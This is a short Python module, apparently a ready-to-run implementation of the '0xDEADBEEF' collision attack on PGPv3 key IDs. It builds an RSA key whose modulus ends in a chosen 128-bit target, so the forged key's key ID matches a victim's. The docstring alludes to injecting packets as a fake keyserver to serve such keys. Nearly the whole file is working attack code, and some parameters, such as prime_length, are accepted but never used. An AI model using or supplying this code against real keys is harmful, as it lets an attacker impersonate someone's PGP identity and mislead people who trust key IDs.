"""A simple implementation of the 0xDEADBEEF attack against PGPv3 key ids.

License: AGPLv3. (And yes, packet-injecting a fake keyserver is providing
a web service. Even if you never say anything about it.)
"""
from __future__ import division, print_function

from Crypto.PublicKey import pubkey
from gmpy import invert

_TEST_TARGET = 0xabadFADAdadaCAFEdeadDEADdeadBEEF


def deadbeef(target=_TEST_TARGET, length=128, prime_length=4096,
             public_exponent=65537):
    """Perform the 0xdeadbeef attack.

    Returns a strong prime `p`, a prime `q`, and a private exponent
    `d` such that the last `length` bits of `p * q` is equal to
    `target`.

    Or loops forever if the last bit of `target` is `0`.
    """
    d = 0
    while not d:
        N = 2 ** length
        p = pubkey.getStrongPrime(2048)
        q = pubkey.getPrime(2048 - length)
        x = target * 2 ** (2048 - 2 * length) - 1
        q = x * ((target * invert(p * x, N)) % N)
        while not pubkey.isPrime(q):
            q += N
        phi = (p - 1) * (q - 1)
        d = invert(public_exponent, phi)
    n = p * q
    e = public_exponent
    return n, e, d, p, q
